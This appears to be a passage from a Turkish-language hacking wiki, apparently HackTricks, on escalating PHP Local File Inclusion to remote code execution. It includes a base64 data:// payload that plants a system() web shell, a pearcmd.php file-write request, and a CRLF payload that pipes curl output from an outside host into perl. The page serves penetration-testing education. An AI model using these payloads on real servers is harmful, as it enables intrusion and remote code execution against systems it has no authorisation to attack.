FTP sunucusu vsftpd için günlükler _**/var/log/vsftpd.log**_ konumundadır. Eğer bir Local File Inclusion (LFI) zafiyeti varsa ve erişilebilir bir vsftpd sunucusu mevcutsa, aşağıdaki adımlar düşünülebilir:

1. Giriş işlemi sırasında username alanına bir PHP payload enjekte et.
2. Enjeksiyon sonrası, LFI'yi kullanarak sunucu günlüklerini _**/var/log/vsftpd.log**_ dosyasından çek.

### php base64 filtresi ile (base64 kullanarak)

Bu [makalede](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) gösterildiği gibi, PHP base64 filter sadece Non-base64 karakterlerini yok sayar. Bunu dosya uzantısı kontrolünü atlatmak için kullanabilirsin: eğer sonu ".php" ile biten base64 sağlarsan, filter "." karakterini yok sayar ve base64'e "php" ekler. İşte bir örnek payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters ile (dosya gerekmez)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) php filters kullanarak çıktı olarak **rastgele içerik üretebileceğinizi** açıklar. Bu, temelde include için **rastgele php kodu üretebileceğiniz** ve bunu bir dosyaya yazmanız **gerekmeyeceği** anlamına gelir.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault ile

**Bir dosya yükleyin**; bu dosya `/tmp` içinde **geçici** olarak saklanacaktır, sonra **aynı istekte** bir **segmentation fault** tetikleyin; böylece **geçici dosya silinmeyecek** ve onu arayabilirsiniz.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage ile

Eğer bir **Local File Inclusion** bulduysanız ve **Nginx** PHP'nin önünde çalışıyorsa, aşağıdaki teknikle **RCE** elde edebilirsiniz:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS ile

Eğer bir **Local File Inclusion** bulduysanız, hatta **oturumunuz yoksa** ve `session.auto_start` `Off` ise. Eğer **multipart POST** verisinde **`PHP_SESSION_UPLOAD_PROGRESS`** sağlarsanız, PHP sizin için **oturumu etkinleştirecektir**. Bunu RCE elde etmek için suistimal edebilirsiniz:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows'ta temp file uploads ile

Eğer bir **Local File Inclusion** bulduysanız ve sunucu **Windows** üzerinde çalışıyorsa, RCE elde edebilirsiniz:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args ile

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Ayrıca, URL üzerinden script'e argüman geçirmek mümkündür çünkü eğer bir URL parametresi `=` içermiyorsa argüman olarak kullanılacağı belirtilmiştir. Ayrıca bakınız [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) ve [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Aşağıdaki istek `/tmp/hello.php` içinde `<?=phpinfo()?>` içeriğiyle bir dosya oluşturur:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Aşağıdaki, RCE elde etmek için bir CRLF zafiyetini suistimal eder (kaynak: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() ile (file_uploads = on)

Eğer bir **Local File Inclusion** bulduysanız ve file_uploads = on olan **phpinfo()** gösteren bir dosya varsa RCE elde edebilirsiniz:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure ile

Eğer bir **Local File Inclusion** bulduysanız ve geçici dosyanın yolunu **can exfiltrate the path** edebiliyorsanız ANCAK **server** **checking** yapıp **file to be included has PHP marks** olup olmadığını kontrol ediyorsa, bu **bypass that check** için bu **Race Condition**'ı deneyebilirsiniz:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce ile

Eğer LFI'yi kötüye kullanarak **upload temporary files** yapabiliyor ve server'ın PHP yürütmesini **hang** ettirebiliyorsanız, geçici dosyayı bulmak için saatlerce **brute force filenames during hours** deneyebilirsiniz:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

Eğer `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarından herhangi birini include ederseniz. (Bu hatayı fırlatmak için aynı dosyayı 2 kez include etmeniz gerekiyor).

**Bunun ne kadar faydalı olduğunu bilmiyorum ama işe yarayabilir.**\
_PHP Fatal Error'a neden olsanız bile, yüklenen PHP geçici dosyaları silinir._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
